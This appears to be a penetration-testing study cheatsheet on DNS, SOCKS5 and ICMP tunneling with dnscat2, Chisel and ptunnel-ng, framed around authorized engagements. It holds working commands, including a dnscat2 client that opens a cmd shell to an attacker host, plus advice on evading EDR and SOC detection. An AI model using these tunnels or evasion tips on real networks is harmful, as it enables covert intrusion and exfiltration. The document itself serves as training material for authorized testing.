# Pivoting & Tunneling Cheatsheet (CPTS)

Covers DNS tunneling (dnscat2), SOCKS5 tunneling (Chisel), and ICMP tunneling (ptunnel-ng), with OPSEC/stealth notes for each.

---

## 1. DNS Tunneling — dnscat2

**Concept:** Exfiltrates/relays data inside DNS TXT record queries via an encrypted C2 channel. Effective against firewalls that strip or deep-inspect HTTPS but pass DNS.

### Setup (attack host = server)
```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
sudo gem install bundler && sudo bundle install
sudo ruby dnscat2.rb --dns host=<ATTACKER_IP>,port=53,domain=<fake.domain> --no-cache
```
→ Server prints a `--secret` key — note it.

### Client (Windows target, PowerShell)
```powershell
# On attack host: git clone https://github.com/lukebaggett/dnscat2-powershell.git, then transfer dnscat2.ps1
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver <ATTACKER_IP> -Domain <fake.domain> -PreSharedSecret <SECRET> -Exec cmd
```

### Server-side interaction
```
dnscat2> windows          # list sessions
dnscat2> window -i 1      # interact with session 1
ctrl-z                    # back out of session
```

### Stealth / OPSEC notes
- Prefer a **registered domain with real NS delegation** over `--no-cache` direct-to-IP mode — traffic then looks like legitimate recursive DNS resolution instead of a host talking straight to an unusual external IP on port 53.
- DNS tunneling is inherently noisy in *volume* — high query rate to one domain, unusual TXT record sizes, and repetitive query patterns are the classic detection signatures (used by tools like Zeek's `dns_tunnel` scripts, Cisco Umbrella, etc.). Throttle session activity where the engagement scope allows.
- Randomize/vary the subdomain query patterns if the C2 tool allows it — repeated identical query structure is a strong signature.
- Never reuse the same tunneling domain across engagements or campaigns — trivially links infrastructure via passive DNS.
- Document this technique's use explicitly in the ROE/authorization — DNS tunneling can trip SOC alerts and should be a known/expected activity to blue team during a purple-team style engagement.

---

## 2. SOCKS5 Tunneling — Chisel

**Concept:** Go-based TCP/UDP tunnel over HTTP, secured with SSH underneath. Forward or reverse pivot modes.

### Build
```bash
git clone https://github.com/jpillora/chisel.git
cd chisel && go build
```
*(Watch glibc mismatches between build host and target — use a prebuilt release binary from GitHub Releases if needed.)*

### Forward pivot (pivot host reachable, acts as server)
```bash
# On pivot host
./chisel server -v -p 1234 --socks5

# On attack host
./chisel client -v <PIVOT_IP>:1234 socks
```

### Reverse pivot (target restricted inbound)
```bash
# On attack host (listener)
sudo ./chisel server --reverse -v -p 1234 --socks5

# On pivot host (initiates outbound)
./chisel client -v <ATTACK_IP>:1234 R:socks
```

### proxychains config (both modes)
```
# /etc/proxychains.conf
socks5 127.0.0.1 1080
```
```bash
proxychains xfreerdp /v:<INTERNAL_TARGET> /u:<user> /p:<pass>
```

### Stealth / OPSEC notes
- **Rename the binary and process** — `chisel` in a process list or on disk is an immediate IOC for any EDR with a signature/hash database. Renaming alone won't beat hash-based detection, so also consider rebuilding from source to get a fresh, unsigned hash.
- **Strip debug symbols and shrink the binary** to reduce both footprint and the chance of matching a known-bad hash: `go build -ldflags "-s -w"`, then optionally UPX-pack (though packing itself can itself be a signature to some AV/EDR — test in a lab first).
- Chisel defaults to a self-signed cert fingerprint printed at startup — an experienced blue teamer fingerprinting your traffic can spot the default Chisel WebSocket handshake pattern. Consider **fronting Chisel behind a legitimate-looking reverse proxy (e.g., Nginx with a valid-looking cert/domain)** so traffic blends with normal HTTPS.
- Traffic runs over HTTP/WebSocket — on port 1234 (or any custom port) it stands out. Run the server on **443 or 80** to blend with expected outbound web traffic.
- Reverse mode (client-initiates-outbound) is generally stealthier in restrictive environments since it avoids needing an inbound firewall rule on the target.
- Kill the chisel process and remove the binary immediately post-engagement (or per ROE cleanup requirements) — leftover pivot tooling is a common finding in post-engagement cleanup checks.

---

## 3. ICMP Tunneling — ptunnel-ng

**Concept:** Encapsulates TCP traffic inside ICMP echo request/reply packets. Works when ICMP is permitted outbound but other protocols are blocked.

### Build
```bash
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
sudo ./autogen.sh
```
Static binary variant (for portability/compat across glibc versions):
```bash
sudo apt install automake autoconf -y
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh
```

### Server (on pivot host)
```bash
sudo ./ptunnel-ng -r<PIVOT_IP> -R22
```
`-r` = jump-box IP to accept connections on; `-R22` = destination port forwarded (SSH here).

### Client (attack host)
```bash
sudo ./ptunnel-ng -p<PIVOT_IP> -l2222 -r<PIVOT_IP> -R22
```
`-p` = target running the ptunnel server; `-l2222` = local port to tunnel through.

### Use the tunnel
```bash
ssh -p2222 -l<user> 127.0.0.1
```

### Dynamic port forwarding for proxychains
```bash
ssh -D 9050 -p2222 -l<user> 127.0.0.1
```
```
socks5 127.0.0.1 9050
```

### Stealth / OPSEC notes
- ICMP tunneling produces an **abnormal volume of ICMP echo traffic** to/from a single host — this is the single biggest tell. Legit ping traffic is low-volume and bursty, not sustained; a SOC watching NetFlow/IPFIX will flag sustained ICMP throughput quickly.
- Keep packet sizes and timing as close to "normal ping" as the tool allows — ptunnel-ng's traffic-shaping options (where available) help reduce statistical anomalies (regular inter-packet timing is itself a signature; some jitter is more natural).
- ICMP tunnels are one of the **easiest tunnel types for a decent NIDS to catch** via payload entropy checks on ICMP data fields (legit ping payloads are typically fixed/patterned, not high-entropy encrypted data) — treat this as a last-resort/short-duration channel, not a persistent C2 mechanism.
- Tear down the tunnel and confirm no `ptunnel-ng` process or binary is left running/resident on either host after use.

---

## General Red-Team Tunneling OPSEC (applies across all three)

- **Attribute nothing to yourself**: don't reuse infrastructure (IPs, domains, cert fingerprints) across engagements.
- **Match traffic to expected baseline**: DNS everywhere is normal; sustained ICMP or oddly-pointed HTTP to a raw IP is not. Pick the tunnel type that blends with what's *already* expected to egress that specific network.
- **Time-box tunnel usage**: stand it up, do the objective, tear it down. Long-lived tunnels are what gets caught during retrospective log review even if missed live.
- **Log your own C2 usage** for the engagement report — you'll need to correlate your actions against the client's detections during the purple-team debrief.
- **Always operate within signed ROE/scope** — tunneling techniques are exactly the kind of activity that can trigger real incident response if not pre-cleared.

---

*Reference: HTB Academy — Pivoting, Tunneling & Port Forwarding module.*
